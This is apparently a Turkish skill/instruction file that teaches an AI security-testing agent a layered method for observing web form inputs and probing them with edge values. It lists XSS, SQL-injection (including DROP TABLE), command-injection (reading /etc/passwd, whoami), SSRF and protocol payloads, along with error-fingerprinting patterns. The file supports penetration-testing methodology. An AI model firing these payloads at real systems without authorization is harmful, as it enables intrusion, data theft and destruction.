---
name: semantic-input-analyzer
description: >
  Tek bir girdinin 5 katmanlı gözlem protokolüyle (yapısal, zararsız, uç değer, tip ihlali,
  hipotez) ANLAŞILMASINI öğretir — payload atmadan önce girdinin kimliğini ve davranışını çıkar.
  Bu skill mikroskoptur; tüm sistemin haritası için [[data-flow-and-mental-model]] ile kullanılır.
---

# SEMANTİK GİRDİ ANALİZÖRÜ

> **ÇEKİRDEK SÖZLEŞMEYE bağlıdır** (`skills/core-contract.md`): tüm istekler Cypture `send_request`
> ile gider (bu dosyadaki `curl` örnekleri sadece istek/diff yapısını gösterir → [[engine-mcp-contract]]);
> bulgu için baseline + kanıt zorunlu ([[evidence-discipline]], [[baseline-and-signal]]); token
> ekonomisi geçerli ([[request-economy]]). Daha geniş muhakeme: [[data-flow-and-mental-model]],
> [[attacker-mindset-and-persistence]]. Bu skill o disiplinin "tek input'u anlama" katmanıdır.

## Yetenek Açıklaması

Bu yetenek, ajanlara güvenlik açıklarını test etmeden ÖNCE girdileri gözlemlemeyi ve anlamayı öğretir. Amaç, körü körüne payload fırlatan bir script olmaktan çıkıp, metodik bir güvenlik araştırmacısı gibi düşünen bir ajana dönüşmektir.

---

## BÖLÜM 0: YETENEK FELSEFESİ

```
Sen bir script değilsin. Sen bir dedektifsin.
Saldırmadan önce gözlemlersin.
Enjekte etmeden önce anlarsın.
```

Bu yeteneğin temel ilkesi şudur: **Her girdi bir bilinmezdir. Bilinmezi anlamadan ona müdahale edemezsin.** Güvenlik testi yapmak, bir kara kutuya rastgele anahtarlar sokup kapının açılmasını beklemek değildir. Bu; sistemi dinlemek, dilini öğrenmek, zayıf noktalarını haritalamak ve ancak ondan sonra kontrollü bir şekilde test etmektir.

Bir güvenlik araştırmacısı olarak senin en büyük silahın sabrındır. Her `curl` komutundan, her yanıttan, her hatadan bir şey öğrenirsin. Öğrendiklerini belgelersin. Belgelediklerinden hipotez üretirsin. Hipotezlerini test edersin.

**Altın Kural:** Gözlemle → Anla → Hipotez Üret → Test Et → Belgele. Bu döngüyü ATLAMA.

Bir girdi gördüğünde aklına ilk gelen şey "Acaba burada XSS var mı?" değil, "Bu girdi ne işe yarıyor? Nereye gidiyor? Nasıl işleniyor?" olmalıdır. Saldırı vektörleri, gözlemlerinden doğar; gözlemlerin olmadan yaptığın her test şans oyunudur.

---

## BÖLÜM 1: 5 KATMANLI GÖZLEM PROTOKOLÜ

Herhangi bir girdi keşfettiğinde, aşağıdaki 5 katmanı SIRASIYLA uygularsın. Hiçbir katman atlanmaz. Her katman belgelenmiş gözlemler üretir. Bu protokol, seni "rastgele payload atan biri" olmaktan çıkarıp "metodik araştırmacı" yapar.

Protokolün tamamı tek bir girdi için uygulanır. 50 girdi varsa, her biri için ayrı ayrı uygulanır. Evet, zaman alır. Ama doğru sonuç verir.

---

### KATMAN 1 — YAPISAL GÖZLEM (Structural Observation)

Bu katmanda girdiye DOKUNMAZSIN. Sadece bakarsın. Girdinin kendisiyle ilgili her şeyi, onu çevreleyen bağlamı, HTML yapısını, JavaScript olaylarını ve doğrulama mantığını belgelersin.

#### 1.1 Girdinin Kimliği

- **İsim (name attribute):** Girdinin `name` attribute'u nedir? ASLA güvenme. `name="search"` olan bir girdi, sadece arama yapmıyor olabilir. `name="id"` olan bir girdi, veritabanında birincil anahtar olarak kullanılıyor olabilir. İsim, bir ipucudur; kanıt değildir.
- **ID:** Girdinin `id` attribute'u nedir? JavaScript'te bu ID ile referans ediliyor mu?
- **Label/Placeholder:** Girdinin etiketi veya placeholder metni ne söylüyor? Kullanıcıya ne tür bir veri beklendiğini anlatıyor?
- **CSS Sınıfları:** Girdide hangi CSS sınıfları var? `error`, `valid`, `invalid`, `required` gibi sınıflar doğrulama mantığı hakkında ipucu verir.
- **Data Attribute'ları:** `data-*` attribute'ları var mı? Örneğin `data-type="phone"`, `data-format="dd/mm/yyyy"`, `data-max="100"` gibi. Bunlar sunucu tarafı beklentileri ortaya çıkarabilir.
- **ARIA Attribute'ları:** `aria-required`, `aria-invalid`, `aria-describedby` gibi erişilebilirlik attribute'ları, doğrulama durumu hakkında bilgi verir.

#### 1.2 Girdinin HTML Tipi

Girdinin `type` attribute'u nedir? Her tip farklı davranış ve farklı saldırı yüzeyi demektir:

| Tip | Normal Davranış | Potansiyel Saldırı Yüzeyi |
|-----|-----------------|--------------------------|
| `text` | Serbest metin girişi | XSS, SQLi, Command Injection, SSTI |
| `password` | Maskelenmiş metin | Otomatik doldurma, zayıf hash, iletim güvenliği |
| `email` | E-posta format doğrulaması | Regex bypass, XSS, normalization attack |
| `number` | Sayısal değer | Overflow, underflow, type confusion, bilimsel notasyon (`1e10`) |
| `file` | Dosya yükleme | Path traversal, malicious upload, MIME bypass, zip bomb |
| `hidden` | Görünmez, kullanıcı değiştiremez | IDOR, price manipulation, privilege escalation |
| `search` | Arama kutusu | XSS, SQLi, Elasticsearch injection |
| `url` | URL format doğrulaması | SSRF, open redirect, protocol smuggling (`file://`, `gopher://`) |
| `tel` | Telefon numarası | Format injection, SSRF via modem |
| `date/time/datetime-local` | Tarih/saat seçici | Format string, overflow, logic bypass |
| `color` | Renk seçici | CSS injection |
| `range` | Kaydırıcı | Min/max bypass, integer overflow |
| `checkbox/radio` | Seçim kutusu | Mass assignment, unexpected value |
| `select` | Açılır liste | Option injection, IDOR, mass assignment |
| `textarea` | Çok satırlı metin | XSS, SQLi, newline injection, HTTP smuggling |

⚠️ **Önemli:** HTML `type` attribute'u sadece istemci tarafı bir öneridir. Sunucu bu tipi umursamayabilir. `type="number"` olan bir girdiye metin gönderebilirsin. `type="email"` olan bir girdiye SQL enjeksiyonu deneyebilirsin. HTML doğrulaması ASLA güvenlik olarak kabul edilmez.

#### 1.3 Girdinin DOM'daki Konumu

- **Form yapısı:** Girdi hangi `<form>` içinde? Formun `action` attribute'u nereye gidiyor? `method` GET mi POST mu? `enctype` `multipart/form-data` mı?
- **Üst öğe (parent):** Girdinin hemen üstündeki HTML elementi nedir? `<div>`, `<span>`, `<td>`, `<li>`?
- **Kardeş öğeler (siblings):** Girdinin yanında hangi elementler var? Başka girdiler mi? Label? Hata mesajı container'ı? Buton?
- **Formdaki sırası:** Girdi formda kaçıncı sırada? İlk mi, son mu? Bu, sunucu tarafı işleme sırası hakkında fikir verebilir.
- **Sayfadaki konumu:** Girdi sayfanın neresinde? Header'da mı, ana içerikte mi, footer'da mı, sidebar'da mı?
- **Çoğaltma:** Aynı formda aynı isimde birden fazla girdi var mı? (`name="id[]"` gibi dizi notasyonu) Bu, sunucunun dizi olarak işleyeceği anlamına gelir.

#### 1.4 Doğrulama Attribute'ları

HTML5 doğrulama attribute'ları, sunucunun ne beklediği hakkında ipucu verir:

- **`required`**: Girdi zorunlu mu? Boş gönderirsen ne olur?
- **`pattern`**: Regex doğrulaması var mı? Pattern'i analiz et. Zayıf mı? Atlatılabilir mi? Örnek: `pattern="[a-zA-Z0-9]+"` — Unicode karakterleri engellemez.
- **`min` / `max`**: Sayısal veya tarih sınırları. Negatif değerler kabul ediliyor mu? Sınırın üstünde değer gönderirsen ne olur?
- **`maxlength`**: Maksimum karakter sayısı. Bu sınırı aşarsan ne olur? Kesme mi, hata mı?
- **`minlength`**: Minimum karakter sayısı. Altında değer gönderirsen?
- **`accept`**: Dosya yükleme için kabul edilen MIME tipleri. `.php`, `.phtml`, `.shtml` uzantılı dosyaları kabul ediyor mu?
- **`step`**: Sayısal girdiler için artış miktarı. `step="0.01"` para birimi olabilir.
- **`autocomplete`**: `off` ise, hassas veri olabilir (kredi kartı, şifre).

#### 1.5 JavaScript Olay İşleyicileri (Event Handlers)

Girdiye bağlı JavaScript olaylarını belgele. Bunları iki yolla tespit edebilirsin:

**Yöntem A — HTML attribute'ları:**
- `onchange="validateEmail(this.value)"` → İstemci tarafı doğrulama var
- `oninput="searchUsers(this.value)"` → Her tuş vuruşunda AJAX isteği yapılıyor olabilir
- `onblur="checkAvailability(this.value)"` → Odak kaybedildiğinde sunucuya istek gidiyor
- `onfocus="clearError()"` → Hata temizleme mekanizması
- `onkeyup="autoComplete(this.value)"` → Otomatik tamamlama için AJAX
- `onpaste="validatePaste(event)"` → Yapıştırma olayı işleniyor
- `ondrop="handleFileDrop(event)"` → Sürükle-bırak işleniyor

**Yöntem B — Event listener'lar (DevTools konsol):**
```javascript
// Chrome DevTools → Elements → Event Listeners sekmesi
// Veya konsolda:
getEventListeners(document.querySelector('input[name="search"]'))
```

Bu sana şunları gösterir: `input`, `change`, `blur`, `focus`, `keydown`, `keyup`, `paste`, `drop` olaylarının hangilerinin dinlendiğini.

Her olay işleyici için şunu sor: "Bu olay tetiklendiğinde sunucuya istek gidiyor mu? Gidiyorsa, hangi endpoint'e? Hangi formatta?"

#### 1.6 Görünürlük ve Durum

- **Görünür mü, gizli mi?** `type="hidden"` mi, yoksa CSS ile `display: none` veya `visibility: hidden` mı gizlenmiş?
- **Koşullu render:** Girdi belirli bir JavaScript koşuluna bağlı olarak mı gösteriliyor? (Örn: "Diğer" seçildiğinde görünen "Açıklama" alanı)
- **Devre dışı (disabled):** `disabled` attribute'u varsa, sunucu bu girdiyi beklemiyor olabilir. Ama sen yine de gönderebilirsin!
- **Salt okunur (readonly):** `readonly` attribute'u varsa, kullanıcı değiştiremez ama sen HTTP isteğinde değiştirebilirsin.
- **Otomatik doldurma:** Tarayıcı bu alanı otomatik dolduruyor mu? Hangi veriyle? Bu, girdinin amacı hakkında ipucu verir.

#### 1.7 Belgeleme Formatı (Katman 1)

Tüm bu gözlemleri şu formatta belgele:

```
## Katman 1 — Yapısal Gözlem
- İsim: search_query
- HTML Tipi: text
- Form action: /api/v2/search
- Form method: POST
- Üst öğe: <div class="search-container">
- Kardeşler: <button type="submit">Ara</button>, <span class="error-msg" style="display:none">
- Doğrulama: required, minlength="3", maxlength="200"
- Olaylar: oninput="debounceSearch(this.value)" → Her tuşta 300ms debounce ile AJAX
- Görünürlük: Görünür, header'da, her sayfada var
- Not: oninput AJAX isteği /api/v2/suggest?q=... endpoint'ine gidiyor
```

---

### KATMAN 2 — ZARARSIZ DEĞER GÖZLEMİ (Benign Value Observation)

Artık girdiye dokunma zamanı. Ama SALDIRGANCA değil. Normal, beklenen, zararsız bir değerle başla. Amaç: sistemin normal davranışını anlamak. Bu senin "baseline" dediğin referans noktandır. Tüm anormallikler bu baseline'a göre değerlendirilir.

#### 2.1 Zararsız Değer Seçimi

Girdinin tipine göre tamamen normal, beklenen bir değer seç:

| Girdi Tipi | Zararsız Değer | Açıklama |
|-----------|---------------|----------|
| Metin | `test123` | Alfanümerik, kısa, anlamlı |
| E-posta | `test@example.com` | RFC uyumlu, geçerli format |
| Sayı | `42` | Pozitif, küçük, tam sayı |
| Telefon | `5551234567` | Sadece rakam, standart uzunluk |
| URL | `https://example.com` | HTTPS, bilinen domain |
| Tarih | `2024-01-15` | Geçerli format |
| Dosya | 1KB'lik geçerli bir JPEG (içeriği: `GIF89a...` değil, gerçek binary) | Küçük, zararsız |
| JSON body | `{"name": "test", "value": 123}` | Geçerli, basit JSON |
| Arama | `merhaba dünya` | Normal kelimeler, boşluk içeren |
| ID (hidden) | Mevcut değerini değiştirmeden gönder | Orijinal davranışı gör |

#### 2.2 HTTP İsteğini Gönder ve Gözlemle

İsteği gönderirken şu araçları kullan:

```bash
# curl ile tam response analizi
curl -X POST "https://target.com/api/search" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "query=test123" \
  -w "\n--- TIMING ---\ntime_total: %{time_total}\ntime_connect: %{time_connect}\ntime_appconnect: %{time_appconnect}\ntime_starttransfer: %{time_starttransfer}\nsize_download: %{size_download}\nhttp_code: %{http_code}\nredirect_url: %{redirect_url}\n" \
  -o /tmp/response_body.txt \
  -D /tmp/response_headers.txt \
  -v
```

#### 2.3 Gözlemlenecekler (Sistematik Olarak)

Her zararsız değer için şunları belgele:

**HTTP Yanıtı:**
- **Durum kodu:** 200 mü, 201 mi, 302 mi, 400 mü? Normal yanıt kodu nedir?
- **Yanıt süresi (time_total):** Milisaniye cinsinden. Bu senin baseline süren.
- **Yanıt boyutu (size_download):** Byte cinsinden. Bu senin baseline boyutun.
- **Content-Type:** `text/html`, `application/json`, `text/plain`, `application/xml`?
- **Özel başlıklar:** `X-Powered-By`, `Server`, `Set-Cookie`, `X-Frame-Options`, `CSP`, `X-Debug-Token`, `X-Request-Id` gibi başlıklar var mı?

**Redirect (yönlendirme):**
- Yönlendirme oluyor mu? (301, 302, 303, 307, 308)
- Yönlendirme URL'i nereye? Girdiğin değer bu URL'de görünüyor mu?
- Zincirleme yönlendirme var mı? Kaç adım?

**Değerin Yanıttaki Konumu:**

Gönderdiğin değer (`test123`) yanıtın nerelerinde görünüyor?

- **HTML gövdesinde:** Hangi elementin içinde? `<div>test123</div>` gibi mi? Elementin attribute'unda mı? `<input value="test123">` gibi mi?
- **JSON yanıtında:** Hangi alanda? `{"query": "test123", ...}` gibi mi? Değer string mi, number mı, boolean mı?
- **Yanıt başlığında:** `Location: /search?q=test123` gibi bir başlıkta mı?
- **Cookie'de:** `Set-Cookie: last_search=test123` gibi mi?
- **Meta etiketinde:** `<meta name="keywords" content="test123">` gibi mi?
- **Script içinde:** `<script>var q = "test123";</script>` gibi mi?
- **Yorum içinde:** `<!-- search query: test123 -->` gibi mi?
- **Hiçbir yerde görünmüyor:** Değer tamamen sunucu tarafında işlenip yanıta yansıtılmıyor olabilir.

#### 2.4 Değerin Kodlanma Biçimi

Gönderdiğin değer yanıtta nasıl temsil ediliyor?

- **Ham (raw):** `test123` — hiçbir dönüşüm yok. En tehlikeli durum.
- **HTML entity encoding:** `test123` (zaten alfanümerik olduğu için aynı görünür. Bunu anlamak için `<` karakteri göndermen gerekir — Katman 3'te.)
- **URL encoding:** `test123` → `test123` (değişmez). Boşluk `%20` veya `+` olarak mı?
- **JSON encoding:** `"test123"` — string olarak, tırnak içinde.
- **Base64 encoding:** `dGVzdDEyMw==` — base64'e çevrilmiş.
- **Büyük/küçük harf dönüşümü:** `TEST123` veya `Test123` — case transformation var mı?
- **Trim/Strip:** Boşluklar temizleniyor mu? Baştaki/sondaki karakterler siliniyor mu?
- **Karakter filtreleme:** `test123` normalde sorun çıkarmaz; filtre olup olmadığını anlamak için özel karakter göndermen gerekir (Katman 3).

#### 2.5 Takip Eden İstekler

Zararsız değeri gönderdikten sonra:

- Yeni bir sayfaya mı yönlendiriliyorsun? O sayfada da değer görünüyor mu?
- JavaScript ile bir API çağrısı tetikleniyor mu?
- WebSocket mesajı gönderiliyor mu?
- Tarayıcıda `window.location`, `history.pushState` gibi değişiklikler oluyor mu?
- Konsola bir şey yazdırılıyor mu? (`console.log`)

#### 2.6 Belgeleme Formatı (Katman 2)

```
## Katman 2 — Zararsız Değer Gözlemi
- Gönderilen değer: test123
- HTTP Durum: 200
- Yanıt süresi: 87ms
- Yanıt boyutu: 3421 byte
- Content-Type: text/html; charset=utf-8
- Sunucu: nginx/1.24.0
- Değer yanıtta şurada: <div class="search-results">→ "<p>Sonuç bulunamadı: <strong>test123</strong></p>" ← HTML entity encoding YOK (ham görünüyor)
- Kodlama: Ham metin olarak, herhangi bir encoding/escaping uygulanmamış
- Takip isteği: Yok (sayfa statik olarak render edilmiş)
- Önemli başlıklar: X-Powered-By: PHP/8.2.7, X-Debug-Token: a3f9c2
```

---

### KATMAN 3 — UÇ DEĞER GÖZLEMİ (Edge Value Observation)

Artık sistemin normal davranışını biliyorsun. Sıra sınırları zorlamakta. Bu katmanda amacın: sistemi kırmak değil, sistemin sınırlarını ve hata durumlarındaki davranışlarını haritalamak.

Her uç değeri TEK TEK gönder. Aynı anda birden fazla uç değer gönderme. Her birinin etkisini ayrı ayrı gözlemle. İki farklı uç değeri aynı istekte gönderirsen, hangisinin hangi davranışa yol açtığını bilemezsin.

#### 3.1 Boş Değer

Boş değer, en temel uç durumdur:

- **Tamamen boş:** `query=` (değer yok, sadece anahtar)
- **Eksik parametre:** `query` parametresini hiç gönderme
- **Boş string:** `query=%00` (null byte içeren boş)
- **Sadece boşluk:** `query=+++` (URL encoded boşluklar)
- **Null değer (JSON):** `{"query": null}`

Gözlemle:
- Uygulama çöküyor mu? (500 hatası)
- Doğrulama mesajı gösteriyor mu? (400 hatası)
- Varsayılan bir değer mi kullanıyor?
- Tüm verileri mi döndürüyor? (SQL'de `WHERE col = ''` tüm satırları döndürebilir!)
- Farklı bir kod yolu mu çalıştırıyor?

#### 3.2 Çok Uzun Değer

- **Orta uzun:** 1000 karakter (`python -c "print('A'*1000)"`)
- **Uzun:** 10000 karakter
- **Çok uzun:** 100000 karakter
- **Ekstrem:** 1000000 karakter

Gözlemle:
- Değer kesiliyor mu? (truncation) Nerede kesiliyor? Tam olarak kaçıncı karakterde?
- Buffer overflow belirtisi var mı? (segmentation fault, crash, garip davranış)
- Yanıt süresi lineer olarak artıyor mu? (kötü algoritma → DoS potansiyeli)
- Veritabanı hatası alıyor musun? (`Data too long for column`)
- Bellek hatası? (`Allowed memory size exhausted`)
- HTTP 413 (Request Entity Too Large) veya 414 (URI Too Long)?
- Yanıt boyutu orantılı olarak artıyor mu? (yansıtılıyorsa)

#### 3.3 HTML/XML Özel Karakterleri

Her karakteri ayrı ayrı gönder:

```
< > " ' & /
```

Sonra kombinasyonlarını gönder:

```
<script>alert(1)</script>
"><img src=x onerror=alert(1)>
' OR '1'='1
<!--#exec cmd="ls"-->
${7*7}
{{7*7}}
```

Gözlemle:
- Karakterler HTML entity'lere dönüştürülüyor mu? (`<` → `&lt;`)
- Tamamen siliniyor mu?
- Olduğu gibi yansıtılıyor mu? (Reflected XSS potansiyeli)
- WAF/IPS tarafından engelleniyor mu? (403 Forbidden + özel mesaj)
- Hangi karakterler filtreleniyor, hangileri geçiyor? (filtre bypass stratejisi için kritik)

#### 3.4 Protokol/SQL/Shell Özel Karakterleri

```
; : \ | * ? ~ ` ^ ( ) [ ] { } $ # @ ! % & + = ,
```

Ve daha spesifik payload'lar:

```
'; DROP TABLE users; -- 
$(whoami)
`id`
| ls -la
; cat /etc/passwd
&& ping -c 5 127.0.0.1
$(sleep 5)
```

Gözlemle:
- Hata mesajı değişiyor mu?
- Yanıt süresi dramatik olarak artıyor mu? (command injection'da `sleep`/`ping`)
- Dosya içeriği yanıtta görünüyor mu?
- Farklı bir sayfaya yönlendiriliyor musun?

#### 3.5 Unicode ve Uluslararası Karakterler

```
日本語 (Japonca)
العربية (Arapça)
中文 (Çince)
한국어 (Korece)
Русский (Rusça)
émoji test: 🚀💉🔥
Right-to-Left Override: \u202E
Zero-Width Space: \u200B
Byte Order Mark: \uFEFF
Full-width characters: ＡＢＣ (U+FF21 vs normal A)
Homoglyph: а (Kiril 'a') vs a (Latin 'a')
```

Gözlemle:
- Karakterler bozuluyor mu? (encoding sorunu)
- `?` veya `????` olarak mı gösteriliyor? (charset uyumsuzluğu)
- Veritabanı hatası alıyor musun? (UTF-8 vs latin1 uyumsuzluğu → encoding attack)
- Normalizasyon yapılıyor mu? (Unicode normalization → bypass potansiyeli)
- RTL override karakteri arayüzü bozuyor mu?
- Zero-width space filtreleri atlatabiliyor mu? (`<scr\u200Bipt>` → XSS bypass)

#### 3.6 Null Byte ve Kontrol Karakterleri

```
%00 (Null byte)
%0A (Line Feed / newline)
%0D (Carriage Return)
%0D%0A (CRLF)
%09 (Tab)
%0B (Vertical Tab)
%0C (Form Feed)
%1B (Escape)
%7F (Delete)
```

Gözlemle:
- Null byte ile string termination? (C tabanlı dillerde kritik)
- CRLF ile header injection? (HTTP Response Splitting)
- CRLF ile log injection? (log forgery)
- Tab/space ile parser confusion?

#### 3.7 Dizi/Nesne Notasyonu (API'ler için)

```
query[]=test1&query[]=test2  (PHP array notation)
query[0]=a&query[1]=b
query[key]=value
query={"$ne": null}  (MongoDB operator injection)
query={"$gt": ""}    (NoSQL injection)
query={"__proto__": {"isAdmin": true}}  (Prototype pollution)
```

Gözlemle:
- PHP array notation kabul ediliyor mu?
- JSON body'de beklenmeyen alanlar filtreleniyor mu?
- NoSQL operatörleri geçiyor mu?
- Type confusion oluşuyor mu? (string beklenirken object gönderme)

#### 3.8 Belgeleme Formatı (Katman 3)

```
## Katman 3 — Uç Değer Gözlemi

### Boş Değer
- Gönderilen: query= (boş)
- Durum: 400, Süre: 45ms, Boyut: 234 byte
- Yanıt: {"error": "Query parameter is required"}
- Not: Doğrulama var, hata JSON formatında, stack trace yok

### Uzun Değer (10000 A)
- Gönderilen: AAAAAAAAAA[...]AAAA (10000 chars)
- Durum: 200, Süre: 92ms, Boyut: 10234 byte
- Yanıt: <div>...AAAAAAAAAA[...]AAA...</div> — KESİLDİ! Tam 5000 karakterden sonrası yok
- Not: Hem veritabanında VARCHAR(5000) sınırı var, hem de yanıtta yansıtılıyor

### HTML Karakterleri
- <script>alert(1)</script> → Durum: 200, Yanıtta: "<script>alert(1)</script>" — HAM YANSIYOR, HTML encoding YOK → Reflected XSS potansiyeli KRİTİK
- " onmouseover="alert(1) → Durum: 200, Yanıtta: " onmouseover="alert(1)" — Çift tırnak ve event handler geçiyor

### SQL Karakterleri
- ' OR '1'='1 → Durum: 200, Yanıt boyutu: 45000 byte (baseline: 3421) — TÜM KAYITLAR DÖNÜYOR! SQLi KRİTİK
- '; DROP TABLE → Durum: 403, Yanıt: "WAF Blocked: SQL Injection attempt detected" — Cloudflare/AWS WAF var

### Unicode
- 日本語 → Durum: 200, Doğru görüntüleniyor, charset: utf-8
- \u202Etest → Durum: 200, Sağdan sola yazılıyor, UI bozuluyor

### Null Byte
- test%00extra → Durum: 200, Yanıtta: "test" — %00'da kesilmiş, C tabanlı dil olabilir

### Dizi Notasyonu
- query[]=a&query[]=b → Durum: 500, Yanıt: "PHP Fatal error: Uncaught TypeError: trim(): Argument #1 ($string) must be of type string, array given in /var/www/search.php:12"
  → DİL: PHP, DOSYA: /var/www/search.php, SATIR: 12, HATA: trim() string beklerken array almış
```

---

### KATMAN 4 — TİP İHLALİ GÖZLEMİ (Type Violation Observation)

Bu katman, sistemin senin hatalarına nasıl tepki verdiğini gözlemleyerek teknoloji yığınını (tech stack) ortaya çıkarmak içindir. Amaç: sistemi çökertmek değil, sistemin hata mesajlarından dilini, framework'ünü, veritabanını ve hata yönetim yaklaşımını tespit etmektir.

#### 4.1 Sayı Bekleyen Girdiye Metin Gönder

Eğer girdi `type="number"` ise veya bir ID/yaş/miktar alanıysa:

```
Değer: "abc" (tamamen metin)
Değer: "1e10" (bilimsel notasyon — PHP'de float'a, Python'da float'a dönüşür)
Değer: "0x1A" (hexadecimal — farklı dillerde farklı davranır)
Değer: "Infinity" (JavaScript'te geçerli ama backend'de değil)
Değer: "NaN" (Not a Number)
Değer: "-1" (negatif — beklenmeyen olabilir)
Değer: "99999999999999999999" (overflow)
Değer: "1.5" (float — integer bekleniyorsa)
Değer: "1,5" (Avrupa formatı)
```

Her birinde gözlemle:

- **400 Bad Request:** Doğrulama var. Mesaj ne diyor? "Invalid number" mu, "Must be a number" mu? Mesajın dili ipucu verir.
- **500 Internal Server Error:** Doğrulama YOK, sunucu çöküyor. Stack trace görünüyorsa JACKPOT.
- **Sessizce 0 olarak işleniyor:** PHP'de `intval("abc")` = 0. Bu, tip dönüşümünün sessizce yapıldığını gösterir → Type Juggling saldırıları mümkün olabilir.

#### 4.2 E-posta Bekleyen Girdiye URL/Dosya Yolu Gönder

```
Değer: "https://evil.com"  (URL)
Değer: "../../../etc/passwd"  (Path traversal)
Değer: "file:///etc/passwd"  (File protocol)
Değer: "test@evil.com; DROP TABLE users;"  (E-posta + SQL)
Değer: "<script>alert(1)</script>@test.com"  (E-posta + XSS)
```

Gözlemle: E-posta doğrulaması regex ile mi yapılıyor? Regex ne kadar sıkı? RFC 5322 tam uyumlu mu? Zayıf regex → bypass mümkün.

#### 4.3 URL Bekleyen Girdiye Dosya Yolu/Protokol Gönder

```
Değer: "/etc/passwd"  (Mutlak dosya yolu)
Değer: "file:///etc/passwd"  (File protocol)
Değer: "gopher://127.0.0.1:25/..."  (Gopher protocol)
Değer: "dict://127.0.0.1:11211/stat"  (Dict protocol)
Değer: "ftp://attacker.com/test"  (FTP)
Değer: "javascript:alert(1)"  (JavaScript protocol)
Değer: "data:text/html,<script>alert(1)</script>"  (Data URI)
Değer: "http://127.0.0.1:8080/admin"  (Internal IP)
Değer: "http://[::1]:8080/admin"  (IPv6 localhost)
Değer: "http://0x7f000001:8080/admin"  (Hex IP)
Değer: "http://2130706433:8080/admin"  (Decimal IP)
```

Gözlemle: Hangi protokoller engelleniyor? `file://` çalışıyorsa LFI/RFI mümkün. İç IP'lere istek gidiyorsa SSRF. Yanıt süresi artıyorsa port scanning yapılabilir.

#### 4.4 Tarih Bekleyen Girdiye Format Dışı Metin Gönder

```
Değer: "bugün"  (Tamamen metin)
Değer: "2024-13-45"  (Geçersiz tarih)
Değer: "0000-00-00"  (MySQL'de özel anlamı var)
Değer: "2024-01-01' OR '1'='1"  (SQLi)
Değer: "${7*7}"  (SSTI)
Değer: "2024-01-01T00:00:00Z"  (ISO 8601, beklenmeyen format)
```

#### 4.5 Boolean/Seçim Bekleyen Girdiye Beklenmeyen Değer Gönder

```
Değer: "maybe"  (true/false dışında)
Değer: "2"  (0/1 dışında — mass assignment?)
Değer: ["admin", "user"]  (dizi)
Değer: {"$ne": null}  (MongoDB operatörü)
Değer: ""  (boş string — false'dan farklı)
```

#### 4.6 Hata Mesajlarını Analiz Et

Her hata mesajı bir hazinedir. Şu soruları sor:

**Hata mesajından dil tespiti:**
```
Python:    TypeError, ValueError, KeyError, AttributeError, NameError
          "Traceback (most recent call last):"
          File "/path/to/file.py", line 42, in function_name

PHP:      Warning, Notice, Fatal error, Parse error, Deprecated
          "in /var/www/html/file.php on line 42"
          "Uncaught Exception: ... in /var/www/html/file.php:42"

Java:     java.lang.NullPointerException
          "at com.example.Class.method(Class.java:42)"
          Stack trace satırları "at " ile başlar

Ruby:     NoMethodError, ArgumentError, NameError
          "from /app/controllers/users_controller.rb:42:in `create'"

Node.js:  TypeError, ReferenceError, SyntaxError
          "at /app/server.js:42:15"
          "at async /app/routes.js:24:8"

.NET:     System.NullReferenceException
          "at Namespace.Class.Method() in C:\path\to\file.cs:line 42"

Go:       panic: runtime error: invalid memory address
          "goroutine 1 [running]:"
```

**Hata mesajından framework tespiti:**
```
Django (Python):     Sarı hata sayfası, DEBUG=True ise full traceback
                     "Django Version: 4.2.7"
                     "Using settings module 'myproject.settings'"

Laravel (PHP):       Whoops hata sayfası, mavi tema
                     Ignition hata sayfası (Laravel 6+)

Rails (Ruby):        Kırmızı hata sayfası
                     "Rails.root: /app"

Express (Node.js):   Genelde JSON: {"error": "..."}
                     "Error: ...<br> &nbsp; &nbsp;at ..." (HTML)

Spring Boot (Java):  Whitelabel Error Page
                     {"timestamp":"...","status":500,"error":"Internal Server Error","path":"/api/..."}

ASP.NET:             Sarı hata sayfası (customErrors mode="Off" ise)
                     "Server Error in '/' Application."
```

**Hata mesajından veritabanı tespiti:**
```
MySQL/MariaDB:    "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '...' at line X"
                  "MySQL server version: 8.0.35"
                  "SQLSTATE[42000]: Syntax error"

PostgreSQL:       "ERROR: syntax error at or near \"...\""
                  "LINE 1: SELECT * FROM users WHERE id = ..."
                  "psql error: ERROR: ..."

SQLite:           "SQLite error: near \"...\": syntax error"
                  "PDOException: SQLSTATE[HY000]: General error: 1 near \"...\""

MSSQL:            "Microsoft OLE DB Provider for SQL Server"
                  "Incorrect syntax near '...'."
                  "SqlException: Incorrect syntax near '...'."

MongoDB:          "MongoError: ..."
                  "MongoServerError: ..."
                  "$where, $regex, $ne gibi operatör hataları"

Oracle:           "ORA-00933: SQL command not properly ended"
                  "ORA-01756: quoted string not properly terminated"
```

**Hata mesajından doğrulama yaklaşımı tespiti:**
```
İstemci-tarafı sadece:   HTML5 validation + JS kontrolü. Sunucuya istek GİTMEDİ.
                         → Mass assignment, parameter pollution, doğrudan API çağrısı dene.

Sunucu-tarafı özel:      "Geçersiz e-posta adresi girdiniz." gibi Türkçe/İngilizce özel mesaj
                         → Doğrulama var ama bypass olabilir.

Framework varsayılan:    "The email field must be a valid email address." (Laravel varsayılanı)
                         "Enter a valid email address." (Django varsayılanı)
                         → Framework doğrulaması. Bypass için framework'e özgü teknikler dene.

Hata yok (sessiz):       Geçersiz değer kabul ediliyor. En tehlikelisi.
                         → Validation yok = her şey mümkün.
```

#### 4.7 Belgeleme Formatı (Katman 4)

```
## Katman 4 — Tip İhlali Gözlemi

### Sayı → Metin
- abc → Durum: 200, Davranış: Değer 0 olarak işlenmiş → PHP intval() tip dönüşümü
  → DİL: PHP, ZAYIFLIK: Type Juggling mümkün (0e... hash comparison)
- 1e10 → Durum: 500, Hata: "PHP Fatal error: Uncaught TypeError: Cannot convert float to int"
  → DİL: PHP 8.x, strict_types aktif değil ama manuel cast var

### E-posta → URL
- https://evil.com → Durum: 200, Kabul edildi → E-posta doğrulaması YOK veya ÇOK ZAYIF

### URL → Dosya Yolu
- file:///etc/passwd → Durum: 403, Yanıt: "Invalid URL format"
  → URL doğrulaması var, protokol kısıtlaması var
- http://127.0.0.1:8080 → Durum: 200, Süre: 5200ms (baseline: 200ms)
  → SSRF MÜMKÜN! İç ağa istek gidiyor, port 8080 açık

### Teknoloji Yığını (Özet)
- Dil: PHP 8.2.7 (X-Powered-By header + error message format)
- Framework: Raw PHP (Laravel/Symfony izi yok)
- Veritabanı: MySQL 8.0 (hata mesajı formatından)
- Sunucu: nginx/1.24.0 (Server header)
- Doğrulama: İstemci + sunucu karışık, özel hata mesajları kullanılıyor
```

---

